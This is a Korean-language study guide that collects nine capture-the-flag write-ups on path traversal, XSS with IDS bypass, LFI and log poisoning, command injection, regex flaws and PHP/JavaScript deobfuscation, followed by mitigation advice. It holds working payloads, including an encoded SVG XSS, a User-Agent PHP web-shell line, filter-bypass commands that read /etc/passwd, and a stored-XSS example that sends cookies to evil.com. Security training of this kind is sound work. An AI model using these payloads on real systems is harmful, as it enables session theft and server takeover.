# Code Injection 완전 정복

> 9개의 실전 문제로 배우는 XSS, LFI, Command Injection, Obfuscation 기법

## 📚 목차

- [학습 가이드](#학습-가이드)
- [문제 목록](#문제-목록)
  - [🟢 Beginner](#beginner)
  - [🟡 Intermediate](#intermediate)
  - [🔴 Advanced](#advanced)
- [핵심 개념 정리](#핵심-개념-정리)
- [방어 기법](#방어-기법)
- [참고 자료](#참고-자료)

---

## 학습 가이드

### 추천 학습 순서

1. Replace (Beginner) - 30분
2. XSS (Intermediate) - 45분
3. LFI_I (Intermediate) - 40분
4. LFI_II (Intermediate) - 60분
5. Regular_Expression (Intermediate) - 90분
6. Command_Injection_I (Advanced) - 50분
7. Command_Injection_II (Advanced) - 40분
8. PHP_Obfuscation (Advanced) - 75분
9. JavaScript_Obfuscation (Advanced) - 60분

### 학습 목표

이 카테고리를 완료하면:

- ✅ XSS 공격의 다양한 우회 기법 습득 (인코딩, IDS 우회)
- ✅ LFI 취약점과 Log Poisoning 기법 이해
- ✅ Command Injection의 제약 환경 우회 방법
- ✅ 정규식 보안 취약점 분석 능력
- ✅ PHP/JavaScript 난독화 해제 기술

### script 연동

**관련 Phase**:
- [Phase 2 - XSS](/script/phase2-vulnerability-basics/03-xss.md)
- [Phase 2 - LFI](/script/phase2-vulnerability-basics/05-lfi.md)
- [Phase 2 - Command Injection](/script/phase2-vulnerability-basics/06-command-injection.md)

---

## 문제 목록

### 🟢 Beginner

#### [Hacker's Diary] Replace: 치환 속에 남겨진 상위 경로

**난이도**: 🟢 Beginner
**예상 시간**: ⏱️ 30분
**주요 기술**: `#Path-Traversal` `#str_replace-Bypass` `#LFI`

## 1. 개요
`str_replace` 함수를 이용한 단순한 문자열 필터링의 허점을 이용하여, 상위 디렉토리의 `pw.php` 파일을 읽고 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 취약점 발견
*   `index.php`에서 `include("files/$file")`를 통해 파일을 로드한다.
*   `$file` 변수에서 `./` 문자열을 제거하는 필터링이 존재한다.

### 공격 가설
1.  **str_replace 우회**: `str_replace`는 단 한 번만 치환을 수행하므로, 필터링 대상 문자열을 중첩하여(예: `..././`) 필터링 후 원하는 문자열(`../`)이 남도록 조작할 수 있다.
2.  **타겟 파일**: 소스 코드 주석에 적힌 `pw.php`가 플래그를 포함하고 있을 것이다.

### 2단계: str_replace 우회 및 플래그 획득
`str_replace` 함수가 문자열을 순차적으로 한 번씩만 치환한다는 점을 이용했다. `../` 문자열을 만들기 위해 다음과 같은 페이로드를 구성했다.

*   **페이로드**: `...//pw.php`
*   **치환 로직**: `.` + `./` + `/` -> `./` 제거 -> `../`
*   **최종 실행**: `include("files/../pw.php");`

위 페이로드를 전송한 결과, 상위 디렉토리에 위치한 `pw.php` 파일이 성공적으로 로드되어 플래그를 확인했다.

**FLAG**: `02aa2628552f8fe531964ef9572f135b`

## 4. 결과: 부적절한 문자열 치환 필터링
특정 위험 문자열을 단순히 공백으로 치환하는 방식은, 문자열을 교묘하게 중첩함으로써 치환 후 원하는 공격 구문이 생성되도록 유도할 수 있는 전형적인 "흔한 실수"다.

## 5. 마무리: 보안 대책
1.  **화이트리스트 기반 필터링**: 허용된 파일명이나 확장자 리스트를 만들어 그 외의 입력은 모두 차단한다.
2.  **basename() 함수 사용**: 경로를 포함한 입력에서 파일 이름 부분만 추출하여 Path Traversal 공격을 원천 차단한다.
    ```php
    $file = basename($_GET['file']);
    ```
3.  **재귀적 치환**: 만약 `str_replace`를 써야 한다면, 대상 문자열이 더 이상 발견되지 않을 때까지 반복적으로 치환하거나 정규표현식을 사용해야 한다. (하지만 화이트리스트 방식이 가장 안전하다.)

---

### 🟡 Intermediate

#### [Hacker's Diary] XSS: 감시의 눈을 피해 쿠키를 훔치다 (Snort Bypass)

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 45분
**주요 기술**: `#XSS` `#IDS-Bypass` `#Base64-Encoding` `#SVG-Tag`

## 1. 개요: 철통 보안 속의 빈틈
이번 문제는 강력한 침입 탐지 시스템(IDS)인 Snort의 감시를 뚫고 XSS를 성공시키는 것이다. 서버는 흔히 쓰이는 공격 키워드들을 촘촘하게 막고 있다. 하지만 아무리 그물이 촘촘해도, 그물 코보다 작은 물고기는 빠져나가기 마련이다.

## 2. 보안 정책(Snort Rule) 심층 분석
서버에 적용된 규칙들은 다음과 같은 핵심 키워드들을 정밀 타격하고 있다.
*   `<script>`: 표준 스크립트 실행 차단
*   `javascript`: 프로토콜 핸들러 차단
*   `alert`: 가장 흔한 검증 함수 차단
*   `document.cookie`: 민감한 정보 접근 차단
*   `<iframe>`, `<img>`: 대체 태그를 이용한 공격 차단

이 정도면 웬만한 공격은 다 막힐 것 같지만, 해커의 창의력은 블랙리스트보다 언제나 한발 앞선다.

## 3. 공격 전략 설계: 보이지 않는 화살
직구(`alert`)가 막혔다면 변화구(`encoding`)를 던져야 한다.

1.  **태그 선택**: `<script>`가 막혔으므로, 그래픽 태그인 `<svg>`의 `onload` 이벤트를 트리거로 삼는다.
2.  **문자열 은닉**: 탐지 엔진이 텍스트를 읽지 못하도록 **Base64 인코딩**을 사용하여 `alert(document.cookie)`를 숨긴다.
    *   `YWxlcnQoZG9jdW1lbnQuY29va2llKQ==` (이 안에 독이 들어있다.)
3.  **동적 복호화 및 실행**: `atob()`로 암호를 풀고, `setTimeout()`을 이용해 풀려난 코드를 즉시 실행시킨다.

## 4. 공격 실행: 최종 페이로드 구성
힌트에 적힌 비밀 코드를 바탕으로 완성된 페이로드는 다음과 같다.

```html
<svg onload=setTimeout(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='),0)>
```

*   **동작 원리**:
    *   `<svg>` 태그가 브라우저에 렌더링되는 순간 `onload`가 발동한다.
    *   `atob()` 함수가 Base64 문자열을 `alert(document.cookie)`로 변환한다.
    *   `setTimeout()`은 이 문자열을 코드로 인식하여 실행한다.
    *   **Snort 입장**에서는 `alert`도, `document.cookie`도 보이지 않으니 유유히 통과시킨다.

## 5. 결과: 금지된 정보의 노출
입력창에 페이로드를 넣고 실행한 결과, 서버의 철통 보안을 비웃듯 브라우저 화면에 현재 세션의 쿠키 정보가 담긴 알림창이 나타났다. 탐지 규칙은 존재했지만, 그 규칙이 감시하지 못하는 사각지대를 정확히 찔렀다.

## 6. 마무리: 블랙리스트의 영원한 숙제
이번 문제는 **"막는 자는 모든 구멍을 막아야 하지만, 뚫는 자는 단 하나의 구멍만 찾으면 된다"**는 보안의 진리를 다시금 일깨워 주었다.

단순히 특정 단어를 차단하는 방식은 인코딩과 대체 태그라는 변수 앞에 언제나 무력해질 수 있다. 진정한 방어는 모든 입력을 '텍스트'가 아닌 '데이터'로 처리하는 **출력 필터링(HTML Entity Encoding)**과 **콘텐츠 보안 정책(CSP)**의 도입에서 시작된다.

---

#### [Hacker's Diary] Local File Inclusion I: 탐정을 속이는 Null Byte

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 40분
**주요 기술**: `#LFI` `#Null-Byte-Injection` `#Extension-Bypass`

## 1. 개요
서버가 강제로 확장자를 추가하는 LFI 취약점 환경에서, 특정 우회 기법을 사용하여 원하는 파일(`pw.php`)을 읽고 플래그를 획득하는 문제다.

## 2. 취약점 분석 및 가설 수립

### 취약점 발견
*   `?file=oldStory1` 요청 시 `oldStory1.txt` 파일의 내용이 출력된다.
*   서버 내부적으로 `include($_GET['file'] . ".txt");` 와 같은 로직이 있을 것으로 판단된다.

### 공격 가설
1.  **Null Byte Injection**: `%00` (Null Byte)을 파일명 끝에 삽입하여 뒤에 붙는 `.txt` 확장자를 무시하게 만든다.
2.  **Filter Bypass**: 힌트에서 Null Byte 차단 규칙을 언급했으므로, 이것이 실제로는 `str_replace`와 같은 단순 치환일 경우 중첩 사용 등을 시도한다.

### 2단계: Null Byte Injection을 통한 우회 및 플래그 획득
서버가 입력값 뒤에 `.txt`를 강제로 추가하는 점을 악용하여 다음과 같은 페이로드를 전송했다.

*   **페이로드**: `pw.php%00`
*   **우회 원리**:
    1. 서버는 `include("pw.php\0.txt");`를 실행하려고 시도한다.
    2. C/C++ 기반의 라이브러리나 낮은 버전의 PHP(5.3.4 미만) 환경에서는 `\0` (Null Byte)을 문자열의 끝으로 인식한다.
    3. 결과적으로 뒤에 붙은 `.txt`가 무시되고 `pw.php` 파일이 실행/로드된다.

위 페이로드를 통해 `pw.php`의 내용을 성공적으로 화면에 출력시켰다.

**FLAG**: `0a7a72fc3e5756268058bdc54a4d204e`

## 4. 결과: 취약한 문자열 처리 로직 및 구버전 소프트웨어 사용
Null Byte Injection은 문자열 끝을 처리하는 언어적 특성을 이용한 고전적인 공격 기법이다. "탐정이 규칙을 추가했다"는 힌트가 있었음에도 불구하고, 실제 서버 환경에서는 이 특수 문자에 대한 검증이 이루어지지 않았음을 확인했다.

## 5. 마무리: 보안 대책
1.  **최신 환경 유지**: PHP 5.3.4 이상의 버전에서는 `include`, `require` 등 파일 관련 함수에서 Null Byte가 포함된 경로를 보안상 이유로 차단한다. 시스템 환경을 최신으로 유지해야 한다.
2.  **입력값 검증(Validation)**: 사용자로부터 받은 파일 경로에서 `%00`, `/`, `..` 등 위험한 특수 문자를 필터링하거나 차단해야 한다.
3.  **화이트리스트 방식 적용**: 읽어올 수 있는 파일 목록을 미리 정의해두고, 그 외의 요청은 모두 거부한다.

---

#### [Hacker's Diary] LFI II: 로그 파일에 독을 발라 쉘을 따다 (Log Poisoning)

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 60분
**주요 기술**: `#LFI` `#Log-Poisoning` `#Code-Execution` `#Directory-Listing`

## 1. 개요: 보이지 않는 캔버스, 로그
이번 문제는 로그 파일과 LFI의 결합이다. 서버는 나의 모든 정보를 로그에 남긴다. 그 로그 파일이 어디에 있는지 알아내고, 그 안에 실행 가능한 코드를 심는다면... 그것이 곧 서버를 장악하는 열쇠가 된다.

## 2. 소스 코드 심층 분석
```php
$user = md5("$_SESSION[id]");
$f = fopen("logs/$user", "a");
fwrite($f, "[$tm] $_SERVER[HTTP_USER_AGENT]\n");
```
*   **분석**: 서버는 내 세션 ID를 해시한 이름의 파일을 `logs/` 폴더에 만들고, 내가 요청한 브라우저 정보(`User-Agent`)를 그대로 써넣는다.
*   **취약점**: `file` 파라미터에 LFI가 존재한다. 만약 내가 `User-Agent`에 PHP 코드를 넣어 로그 파일에 저장시키고, 그 로그 파일을 `include` 한다면? 완벽한 시나리오다.

## 3. 1차 난관: 유령 로그 파일 찾기 (실패)
가장 큰 문제는 **"내 로그 파일의 이름이 무엇인가?"**였다.
- **가설 1**: `$_SESSION[id]`가 내 세션 쿠키 값(`PHPSESSID`)일 것이다.
- **시행**: 쿠키 값을 MD5로 해시하여 `?file=logs/[hash]`를 해봤지만 결과는 `Invalid file`.
- **가설 2**: `$_SESSION[id]`가 `guest`와 같은 문자열일 것이다.
- **시행**: `guest`, `admin` 등을 해시해 보았지만 역시나 실패. "아, 여기서 막히는구나." 싶어 좌절감이 밀려왔다.

## 4. 뜻밖의 돌파구: 보안 설정의 허술함 (Directory Listing)
혹시나 하는 마음에 `/challenges/lfi2/logs/` 경로에 직접 들어가 보았다.
*   **발견**: 서버가 **디렉토리 인덱싱(Directory Listing)**을 막아놓지 않았다!
*   **분석**: 폴더 안의 모든 파일 목록이 보였다. 나는 즉시 내 접속 시간과 일치하고, 크기가 매번 늘어나는 파일 하나를 특정했다. 파일명은 `1000a63e7279a5f7e6e0b72baf733352`였다. 드디어 캔버스를 찾았다.

## 5. 공격 실행: 독이 든 성배 (Log Poisoning)

### 1단계: 코드 주입 (Poisoning)
`curl` 명령어를 사용하여 `User-Agent` 헤더를 조작했다.
```bash
curl -H "User-Agent: <?php system('cat ../flag.php'); ?>" "URL"
```
이제 내 로그 파일의 마지막 줄에는 서버의 은밀한 파일을 열어보는 명령어가 박혀 있게 된다.

### 2단계: 함정 발동 (Inclusion)
LFI 취약점을 이용해 방금 오염시킨 로그 파일을 호출했다.
*   **Payload**: `index.php?file=logs/1000a63e7279a5f7e6e0b72baf733352`

## 6. 결과: 선명한 플래그
화면 가득히 수많은 브라우저 접속 기록들이 지나가더니, 가장 밑바닥에 내가 원했던 플래그가 나타났다.

**FLAG**: `dc87b466681c552ad7ec1ca1fdef9bde`

## 7. 마무리: 우리가 잊지 말아야 할 것
해킹은 연쇄적인 취약점의 폭발이다. 만약 서버가 디렉토리 리스팅만 막았어도, 혹은 로그에 기록되는 데이터(`User-Agent`)를 필터링만 했어도 이 공격은 성립하지 않았을 것이다. 작은 실수 하나가 어떻게 시스템 전체의 치명적인 결함으로 이어지는지 보여준 정석적인 문제였다.

---

#### [Hacking Tutorial] Regular Expression: 최소주의의 미학, 정규식의 틈새 찾기

**난이도**: 🟡 Intermediate
**예상 시간**: ⏱️ 90분
**주요 기술**: `#Regex` `#Pattern-Analysis` `#IPv6` `#Minimization`
**관련 스크립트**: [solve_regexp.py](../Scripts/solve_regexp.py)

## 1. 개요: 짧을수록 아름답다
이번 문제는 정규식(Regular Expression)의 패턴을 이해하고, 그 패턴을 만족하는 **가장 짧은 문자열**을 찾는 문제다. 보안 검증에서 정규식은 매우 흔하게 사용되지만, 패턴의 세부 사항을 제대로 이해하지 못하면 예상치 못한 입력을 허용할 수 있다.

## 2. 문제 분석: 두 개의 패턴, 하나의 목표

### Pattern 1: 이메일 형식의 복잡한 패턴
```regex
/F+[A-Z0-9._%+-]*!@[a-zA-Z0-9]{0,128}g_i[[:alpha:]]*[sS]+/
```

정규식을 하나씩 분해하면서 최소 길이를 계산해보자:

```
F+                    → "F"    (최소 1개)
[A-Z0-9._%+-]*        → ""     (0개 가능, 생략)
!@                    → "!@"   (필수)
[a-zA-Z0-9]{0,128}    → ""     (0개 가능, 생략)
g_i                   → "g_i"  (필수)
[[:alpha:]]*          → ""     (0개 가능, 생략)
[sS]+                 → "s"    (최소 1개)
```

**최소값**: `F!@g_is` (총 7자)

### Pattern 2: IP 주소 검증 패턴

이 패턴은 IPv4 또는 IPv6 주소를 검증한다. 특히 마지막 부분에 `::1`이 명시적으로 포함되어 있다.

**IPv4 최소값**:
- 가장 짧은 유효한 IPv4: `0.0.0.0` (7자)

**IPv6 최소값**:
- 정규식 마지막 부분에 `::1` 명시
- `::1`은 IPv6 loopback 주소 (localhost)의 축약형
- 길이: **3자** ← 가장 짧다!

**최소값**: `::1` (총 3자)

## 3. 최종 공격

```bash
curl -sk -b "PHPSESSID=..." \
  -X POST \
  -d "input1=F!@g_is&input2=::1" \
  "URL"
```

**FLAG**: `73a7024aad07bf27f9d195e1f2a13c4e`

**정답**:
- **input1**: `F!@g_is` (7자)
- **input2**: `::1` (3자)

## 4. 보안 교훈

### 문제점: 과도하게 관대한 정규식

**올바른 이메일 검증**:
```regex
/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/
```
- `+`를 사용해 최소 1개 이상 강제
- 도메인 부분 명확히 분리
- TLD(최상위 도메인) 검증 포함

### 정규식 작성 시 주의사항

1. **`*` vs `+` 선택**:
   - `*` : 0개 이상 (생략 가능)
   - `+` : 1개 이상 (필수)

2. **`{0,n}` 사용 주의**:
   - `{0,128}` : 0개도 허용
   - `{1,128}` : 최소 1개 필요

3. **앵커 사용**:
   - `^` : 문자열 시작
   - `$` : 문자열 끝
   - 없으면 부분 매칭도 허용됨

---

### 🔴 Advanced

#### [Hacker's Diary] Command Injection I: 명령어 한 줄의 위력

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 50분
**주요 기술**: `#Command-Injection` `#3-Char-Limit` `#System-Command` `#Path-Traversal`

## 1. 개요
관리자 페이지의 로직 허점을 이용해 시스템 명령어를 실행하고 플래그를 획득하는 문제다.

## 2. 취약점 분석

### 가설 1: 파일 다운로드 취약점
*   `down.cgi`를 통해 `admin.cgi`의 소스 코드를 읽어올 수 있을 것이다.

### 가설 2: Command Injection 취약점 존재
*   관리자 기능 중 시스템 명령어를 호출하는 부분에 메타 문자(`;`, `|`, `&`)를 삽입하여 임의의 명령을 실행할 수 있을 것이다.

## 3. 공격 실행

1.  **쿠키 인증 우회**: `sessionId=admin` 쿠키가 있으면 관리자 페이지에 접근할 수 있다.

2.  **Command Injection**: `del` 파라미터 값이 `system("rm -f files/$fname")` 구문에 삽입된다. 단, 입력값은 3글자 이하여야 한다.

3.  **공격 실행**: `;ls` (3글자) 페이로드를 `del` 파라미터에 담아 전송했다.
    *   **최종 실행 명령어**: `rm -f files/;ls`

4.  **결과 확인**: 현재 디렉토리에 존재하는 `ReadMe_ifUcan.php` 파일명을 확인했다.

**FLAG**: `9af8e373ddc7075d75fc69635fe09b5b`

## 4. 마무리: 보안 대책

1.  **명령어 직접 실행 금지**: `system()`, `exec()` 등 쉘 명령어를 직접 호출하는 함수 대신, 언어에서 제공하는 파일 라이브러리 함수(예: `unlink()`)를 사용해야 한다.

2.  **입력값 검증**: 사용자 입력값에서 메타 문자(`;`, `|`, `&`, `*`, `(`, `)`)를 엄격히 필터링해야 한다.

3.  **최소 권한 및 웹 루트 분리**: 중요한 데이터 파일은 웹 브라우저가 직접 접근할 수 없는 위치에 저장하고, 서버 프로세스의 파일 시스템 접근 권한을 최소화한다.

---

#### [Hacker's Diary] Command Injection II: 필터링의 빈틈, 개행 문자

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 40분
**주요 기술**: `#Command-Injection` `#Newline-Injection` `#Blacklist-Bypass`

## 1. 개요
강력한 블랙리스트 필터링이 적용된 환경에서, 필터링되지 않은 특수 문자를 찾아내어 시스템 명령어를 실행하고 플래그를 획득하는 문제다.

## 2. 취약점 분석

### 취약점 발견
*   `index.php`는 `ip` 파라미터를 받아 `nmap` 명령어를 구성한다.
*   다양한 메타 문자를 차단하지만, 개행 문자(`\n`)에 대한 검증이 누락되어 있다.

### 공격 가설
1.  **Newline Injection**: `%0a`를 명령어 구분자로 사용하여 `nmap` 실행 후 임의의 명령(예: `ls`)을 실행할 수 있을 것이다.

## 3. 공격 실행

### 1단계: 개행 문자 주입 및 파일 목록 유출
필터링 목록에서 개행 문자(`\n`, `%0a`)가 빠져있음을 확인하고, 이를 이용해 명령어를 주입했다.

*   **입력값**: `127.0.0.1%0als`
*   **최종 실행 명령어**:
    ```bash
    nmap -p 1-1024 127.0.0.1
    ls
    ```
파일 목록을 통해 현재 디렉토리에 `pw.cgi` 파일이 존재함을 파악했다.

### 2단계: 플래그 획득
`cat` 명령어를 추가로 주입하여 `pw.cgi` 파일의 내용을 읽어 들였다.
*   **최종 페이로드**: `127.0.0.1%0acat pw.cgi`

**FLAG**: `@webbasednmapFLAG@`

## 4. 마무리: 보안 대책

1.  **화이트리스트 기반 필터링**: 허용된 문자(예: 숫자와 점만으로 구성된 IP 형식)만 입력받도록 정규표현식(`preg_match`)을 사용해야 한다.
    *   예시: `if (!preg_match('/^[0-9.]+$/', $ip)) { die("Invalid IP"); }`
2.  **쉘 인자 탈출(Shell Escaping)**: `escapeshellarg()` 또는 `escapeshellcmd()` 함수를 사용하여 사용자 입력값이 명령어로 해석되지 않도록 처리해야 한다.
3.  **시스템 명령어 호출 지양**: `nmap`과 같은 외부 프로그램을 직접 실행하기보다, 필요하다면 PHP 전용 라이브러리를 사용하거나 엄격하게 제어된 API를 통해 기능을 구현해야 한다.

---

#### [Hacking Tutorial] PHP Obfuscation: 양파 껍질 벗기기, 다층 난독화의 함정

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 75분
**주요 기술**: `#PHP-Obfuscation` `#gzdeflate` `#base64` `#Multi-Layer-Decode`

## 1. 개요: 숨겨진 코드, 겹겹이 쌓인 암호화
PHP 난독화(Obfuscation)는 악성 코드를 숨기거나 소스 코드를 보호하기 위해 자주 사용되는 기법이다. 이번 문제는 `gzdeflate()`와 `base64_encode()`를 사용한 다층 난독화를 풀어내는 문제다.

## 2. 문제 분석

### 암호화된 텍스트
```
09dXSElNLqosKOFKTc7IV1By83F0V8gsVkivysxLy0ksSdVISixONTOJByrLT0nV8K2KNCyucvIODvHy9EvyNQipCjQONijw8ctK8Q1xLTbwdS2u8Ms29A9x8XVzdLS11VQCAA==
```

### 암호화 과정
```php
gzdeflate($plainText)    // 1단계: DEFLATE 알고리즘으로 압축
    ↓
base64_encode(...)       // 2단계: Base64 인코딩
    ↓
암호화된 문자열
```

## 3. 풀이 전략: 역순으로 풀기

### Python 복호화 스크립트
```python
import base64
import zlib

encrypted = "09dXSElNLqosKOFKTc7IV1By83F0V8gsVkivysxLy0ksSdVISixONTOJByrLT0nV8K2KNCyucvIODvHy9EvyNQipCjQONijw8ctK8Q1xLTbwdS2u8Ms29A9x8XVzdLS11VQCAA=="

# Base64 디코딩
decoded = base64.b64decode(encrypted)

# zlib 압축 해제
plaintext = zlib.decompress(decoded, -15)

print(plaintext.decode('utf-8'))
```

### 결과: 또 다른 암호화!
```php
// decrypt
echo "FLAG is gzinflate(base64_decode(MzY1szBKSTJINbM0TzQ3S0pLNjdMTEs0MEsxNk1OTDMFAA==)"
```

**발견**: FLAG가 또 다른 암호화 문자열로 숨겨져 있다! 이것은 **2단계 난독화**였다.

## 4. 2차 복호화

```python
encrypted2 = "MzY1szBKSTJINbM0TzQ3S0pLNjdMTEs0MEsxNk1OTDMFAA=="
decoded2 = base64.b64decode(encrypted2)
plaintext2 = zlib.decompress(decoded2, -15)
print(plaintext2.decode('utf-8'))
```

### 최종 결과
**FLAG**: `35682db0e697a76bfc71afa06d35caf5`

## 5. PHP 난독화 기법 분석

### 일반적인 패턴

#### 1. Base64 + eval
```php
eval(base64_decode("ZWNobyAiSGVsbG8gV29ybGQiOw=="));
```

#### 2. gzdeflate + base64 + eval
```php
eval(gzinflate(base64_decode("암호화된문자열")));
```

#### 3. 다층 난독화 (이번 문제)
```php
eval(gzinflate(base64_decode(
    gzinflate(base64_decode("암호화된문자열"))
)));
```

## 6. 결론

**핵심 교훈**:
1. **난독화 ≠ 암호화**: 난독화는 쉽게 복원 가능
2. **다층 난독화**: 악성 코드는 여러 층으로 숨김
3. **자동화 가능**: 간단한 스크립트로 자동 복호화 가능
4. **실제 보안 필요**: 암호화(encryption)를 사용해야 함

---

#### [Hacking Tutorial] JavaScript Obfuscation: 전설의 용사, 난독화 봉인을 풀다

**난이도**: 🔴 Advanced
**예상 시간**: ⏱️ 60분
**주요 기술**: `#JS-Obfuscation` `#Array-Rotation` `#Hex-Encoding` `#Deobfuscation`

## 1. 개요
JavaScript 난독화 코드를 분석하여 숨겨진 파일명을 찾아내고 플래그를 획득하는 문제다.

## 2. 난독화 코드 분석

### 문자열 배열 발견
```javascript
function _0x59ca(){
    var _0x4128f8=['href','indexOf','99.999.php'];
    return _0x4128f8;
}
```

**발견**: 의미 있는 문자열들이 숨어있다!
- `'href'`
- `'indexOf'`
- `'99.999.php'`

### 핵심 로직 찾기
```javascript
if(document['URL'][_0x57b0c4(0x1cb)]('document.cookie')!=-0x1)
    location[_0x57b0c4(0x1ca)]=_0x57b0c4(0x1cd);
```

## 3. 코드 해석: 봉인 해제

난독화 해제:
```javascript
if(document.URL.indexOf('document.cookie') != -1)
    location.href = '99.999.php';
```

**의미**:
- URL에 문자열 `'document.cookie'`가 포함되어 있으면
- `99.999.php`로 리다이렉트한다!

## 4. 공격 전략

직접 목표 파일 접근:
```bash
curl -sk -b "PHPSESSID=..." \
  "URL/99.999.php"
```

**FLAG**: `3da2cb57bea12673c512204691e2d2f8`

## 5. JavaScript 난독화 패턴

### 일반적인 기법

#### 1. 변수명 난독화
```javascript
// 원본
var username = "admin";

// 난독화
var _0x4a2c = "admin";
```

#### 2. 문자열 배열 숨김
```javascript
// 원본
console.log("Hello");

// 난독화
var _0x1234 = ["Hello"];
console.log(_0x1234[0]);
```

#### 3. 16진수 인코딩
```javascript
// 원본
alert("FLAG");

// 난독화
alert("\x46\x4c\x41\x47");
```

## 6. 결론

**핵심 교훈**:
1. **난독화는 읽기 어렵게 만들 뿐, 숨길 수 없다**
2. **자동화 도구로 대부분 해제 가능**
3. **진짜 보안은 서버 사이드에서**
4. **클라이언트 코드는 항상 노출되어 있다고 가정**

---

## 핵심 개념 정리

### 1. XSS (Cross-Site Scripting)

악의적인 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격 기법.

#### XSS 유형

**Reflected XSS**: URL 파라미터를 통해 즉시 반사
```html
http://site.com/search?q=<script>alert(1)</script>
```

**Stored XSS**: DB에 저장되어 지속적으로 실행
```html
게시판 댓글: <script>location='http://evil.com?c='+document.cookie</script>
```

**DOM-based XSS**: JavaScript에서 DOM 조작 시 발생
```javascript
document.write(location.hash);
```

#### 우회 기법

| 기법 | 예시 | 설명 |
|------|------|------|
| 태그 변경 | `<svg onload=...>` | script 태그 차단 시 대체 |
| 인코딩 | `atob('YWxlcnQ=')` | Base64 인코딩 |
| 16진수 | `\x61lert(1)` | Hex 인코딩 |
| 대소문자 | `<ScRiPt>` | 대소문자 혼합 |

### 2. LFI (Local File Inclusion)

서버의 파일 시스템에 접근하여 민감한 파일을 읽어오는 공격 기법.

#### 기본 기법

```
../../../etc/passwd      # Path Traversal
index.php%00             # Null Byte Injection (PHP < 5.3.4)
php://filter/...         # PHP Wrapper
```

#### Log Poisoning

1. 로그 파일 위치 파악
2. User-Agent 등에 PHP 코드 삽입
3. LFI로 로그 파일 include
4. 코드 실행

```bash
# 1. 로그 오염
curl -H "User-Agent: <?php system($_GET['c']); ?>" http://target.com

# 2. LFI로 실행
http://target.com?file=../../logs/access.log&c=cat /etc/passwd
```

### 3. Command Injection

사용자 입력을 시스템 명령어로 실행하여 서버를 장악하는 공격 기법.

#### 명령어 구분자

```bash
;     # 명령어 순차 실행
|     # 파이프
&     # 백그라운드 실행
&&    # 조건부 실행
||    # OR 실행
`cmd` # 명령어 치환
$(cmd) # 명령어 치환
%0a   # 개행 (newline)
```

#### 제한된 환경 우회

**3글자 제한**:
```bash
;ls    # 파일 목록
;id    # 사용자 확인
;pwd   # 현재 경로
```

**공백 제한**:
```bash
{cat,/etc/passwd}    # Brace expansion
IFS=$'\t';cat$IFS/etc/passwd  # IFS 변수 활용
```

### 4. 정규식 (Regular Expression) 보안

#### 위험한 패턴

```regex
.*               # 모든 문자 허용
[A-Z0-9]*        # 0개도 허용 (생략 가능)
{0,n}            # 최소값 0
^없음$없음        # 부분 매칭 허용
```

#### 안전한 패턴

```regex
^[a-zA-Z0-9]+$   # 앵커 + 최소 1개 이상
{1,n}            # 최소 1개 필요
[\w\d]{6,20}     # 정확한 길이 제한
```

### 5. 난독화 (Obfuscation)

코드를 읽기 어렵게 만드는 기법 (암호화와 다름!)

#### PHP 난독화

```php
// Base64
eval(base64_decode("..."));

// gzdeflate + base64
eval(gzinflate(base64_decode("...")));

// str_rot13
eval(str_rot13("..."));
```

#### JavaScript 난독화

```javascript
// 변수명 난독화
var _0x4a2c = "secret";

// 문자열 배열
var _0x1234 = ["a","b","c"];
console.log(_0x1234[0]);

// Hex 인코딩
"\x61\x6c\x65\x72\x74"  // "alert"
```

---

## 방어 기법

### 1. XSS 방어

#### 출력 필터링 (가장 중요!)
```php
// HTML 컨텍스트
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript 컨텍스트
echo json_encode($user_input);

// URL 컨텍스트
echo urlencode($user_input);
```

#### CSP (Content Security Policy)
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' https://trusted.com">
```

#### HttpOnly 쿠키
```php
setcookie('session', $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

### 2. LFI 방어

#### 화이트리스트
```php
$allowed_files = ['page1.php', 'page2.php', 'page3.php'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die('Invalid file');
}

include($file);
```

#### basename() 사용
```php
$file = basename($_GET['file']);
include("pages/$file");
```

#### 경로 정규화 검증
```php
$realpath = realpath("pages/" . $_GET['file']);
if (strpos($realpath, '/var/www/pages/') !== 0) {
    die('Path traversal detected');
}
```

### 3. Command Injection 방어

#### 명령어 실행 금지
```php
// ❌ 나쁜 예
system("rm -f files/" . $_GET['file']);

// ✅ 좋은 예
unlink("files/" . basename($_GET['file']));
```

#### escapeshellarg() 사용
```php
$safe_arg = escapeshellarg($_GET['input']);
exec("program $safe_arg");
```

#### 화이트리스트 검증
```php
if (!preg_match('/^[0-9.]+$/', $_GET['ip'])) {
    die('Invalid IP address');
}
exec("ping -c 1 " . $_GET['ip']);
```

#### disable_functions 설정
```ini
; php.ini
disable_functions = exec,system,shell_exec,passthru,popen,proc_open
```

### 4. 정규식 보안

#### 앵커 사용
```regex
// ❌ 나쁜 예
/[a-z]+/

// ✅ 좋은 예
/^[a-z]+$/
```

#### 적절한 수량자
```regex
// ❌ 0개 허용
/[A-Z]*/

// ✅ 최소 1개
/[A-Z]+/
```

#### 테스트
```python
import re

pattern = r'^[a-z]{3,20}$'
test_cases = [
    "abc",      # PASS
    "ab",       # FAIL (너무 짧음)
    "ABC",      # FAIL (대문자)
    "abc123",   # FAIL (숫자 포함)
]

for test in test_cases:
    match = re.match(pattern, test)
    print(f"{test:10s}: {'PASS' if match else 'FAIL'}")
```

### 5. 난독화 탐지

#### 의심스러운 패턴
```php
// PHP
eval(...)
base64_decode(...)
gzinflate(...)
str_rot13(...)
preg_replace('/e', ...)

// JavaScript
eval(...)
Function(...)
atob(...)
document.write(...)
```

#### 자동 탐지 스크립트
```python
import re

def detect_obfuscation(code):
    suspicious = [
        r'eval\(',
        r'base64_decode\(',
        r'gzinflate\(',
        r'Function\(',
        r'atob\(',
    ]

    for pattern in suspicious:
        if re.search(pattern, code):
            return True
    return False
```

---

## 참고 자료

